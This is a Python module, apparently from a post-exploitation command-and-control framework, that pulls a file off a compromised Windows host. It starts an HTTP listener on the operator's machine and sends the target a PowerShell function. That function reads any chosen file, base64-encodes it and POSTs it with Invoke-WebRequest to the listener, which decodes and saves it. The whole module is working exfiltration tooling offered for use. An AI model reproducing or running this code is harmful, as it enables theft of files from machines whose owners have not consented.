from printib import print_ok, print_info, print_error
from module import Module
from time import sleep
from threading import Thread
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, unquote
from base64 import b64decode


FILE_RECV = False
FILE_RECV_ERROR = False
WORKING_FILE = ""


class GetFile(BaseHTTPRequestHandler): 
    # To avoid logs in our screen
    def log_message(self, format, *args):
        return
        
    def _set_response(self): 
        self.send_response(200) 
        self.send_header('Content-type', 'text/html') 
        self.end_headers() 

    def do_GET(self): 
        self._set_response()
        self.wfile.write(''.encode('utf-8'))

    def do_POST(self): 
        global FILE_RECV, WORKING_FILE, FILE_RECV_ERROR
    
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        self._set_response()

        self.wfile.write(''.encode('utf-8'))

        try:
            post_data = post_data.decode()
            fields = parse_qs(post_data)
            results = fields['results'][0]

            recv = str(unquote(results)) # normalmente es un string base64

            if recv == 'Sended':
                FILE_RECV = True
            elif recv == 'Error':
                FILE_RECV_ERROR = True
            else:
                WORKING_FILE += recv

        except:
            print_error("Error reading results at file download.")
            FILE_RECV_ERROR = True

    def do_HEAD(self): 
        self._set_response() 


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "download-file",
                       "Description": "Recive a file",
                       "Author": "@gaizka_gg"
                       }

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                    "ip": [None, "Your local IP", True],
                   "interface": ["0.0.0.0", "Listener address", True],
                    "port": ["8081", "Listener port", True],
                    "source": [None, "File that will transfer the warrior", True],
                   "dest": ["/tmp/", "Path to save the transfered file", True] }

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        global FILE_RECV, WORKING_FILE, FILE_RECV_ERROR
        function = """function download-file {
    param (
        [Parameter(Mandatory)]
        [string] $source,
        [Parameter(Mandatory)]
        [string] $uri
    )

    $base64 = ''
    
    try 
    {
        $bytes = [System.IO.File]::ReadAllBytes($source)
        $base64 = [Convert]::ToBase64String($bytes)
    }
    catch 
    { }

    if ($base64.Length -gt 0)
    {
        iwr -UseBasicParsing -Method POST -Uri $uri -Body @{results=$base64}
        iwr -UseBasicParsing -Method POST -Uri $uri -Body @{results='Sended'}

        return 'Done'
    }
    else
    {
        iwr -UseBasicParsing -Method POST -Uri $uri -Body @{results='Error'}
    }

    return 'Source not found'
}
            """


        function += 'download-file -source "' + self.args["source"] + '" -uri http://' + self.args["ip"] + ':'+ self.args["port"] + '/'
        listener = Thread(target=self.run, name='download listener', kwargs={'address':self.args["interface"], 'port':int(self.args["port"])})
        listener.start()
        super(CustomModule, self).run(function)

        print_info("If you got any exception, use Ctrl+C to stop the module.")
        while not FILE_RECV and not FILE_RECV_ERROR:
            pass
        
        if FILE_RECV:
            path = self.args["dest"]
            source = self.args["source"]
            if "\\" in source:
                name = source.split("\\")[-1]
            else:
                name = source.split("/")[-1]

            with open(path + '/' + name, 'wb') as f:
                try:
                    f.write(b64decode(WORKING_FILE))
                except:
                    f.write(WORKING_FILE)
                f.close()

        elif FILE_RECV_ERROR:
            print_error('An error ocurried receiving the file.')
        
        FILE_RECV = False
        FILE_RECV_ERROR = False
        WORKING_FILE = ""
        sleep(1)

    
    def run(self, server_class=HTTPServer, handler_class=GetFile, address=None, port=9999):
        try: 
            server_address = (address, port)
            httpd = server_class(server_address, handler_class)
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                pass
            httpd.server_close()
        except:
            pass
